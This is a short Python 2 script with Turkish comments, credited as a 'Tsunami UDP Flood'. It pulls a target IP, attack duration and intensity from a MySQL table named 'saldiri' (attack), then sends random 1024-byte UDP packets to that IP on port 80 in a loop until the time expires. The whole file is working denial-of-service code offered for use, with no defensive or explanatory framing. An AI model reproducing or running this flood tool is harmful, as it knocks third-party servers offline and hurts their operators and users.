#!/usr/bin/env python
# -*- coding: utf-8 -*
import mysql.connector
import time, socket, os, sys, string
import random

db= mysql.connector.connect(user='root', password='',
                              host='localhost',
                              database='vt',use_pure=False)

cursor = db.cursor()
sql = "SELECT * FROM saldiri \
       WHERE id = '%d'" % (2)

try:
   # Execute yöntemi ile sql kdlarımızı çalıştırıyoruz.
   cursor.execute(sql)
   # Liste içindeki listelerden tüm satırları çekiyoruz
   results = cursor.fetchall()
   for row in results:
      ip = row[1]
      sure = row[2]
      siddet = row[3]


except:
   print "Error: unable to fecth data"
print "Saldirilacak Ipi "+ip+" Saldiri Suresi= "+str(sure)+" Saldiri Siddeti= "+siddet

# Veritabanı bağlantısını sonlandırıyoruz
db.close()

# cevap=raw_input("Saldırıyı Onaylıyor Musunuz (y,n)") if(cevap=="y"): print"saldırı basladi"
credits = (
    'Tsunami UDP Flood'
    'Power By Ramazan Serif AKBUZ'
    )
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
bytes = random._urandom(1024) 
 
def pres(): 
    global credits
    print credits
pres()
victim  = ip
vport = 80
duration  =sure
timeout =  time.time() + duration
sent = 0
 
while 1:
    if time.time() > timeout:
        break
    else:
        pass
    client.sendto(bytes, (victim, vport))
    sent = sent + 1
    print "Saldiri Basladi %s Paket Yollaniyor %s at the port %s "%(sent, victim, vport)

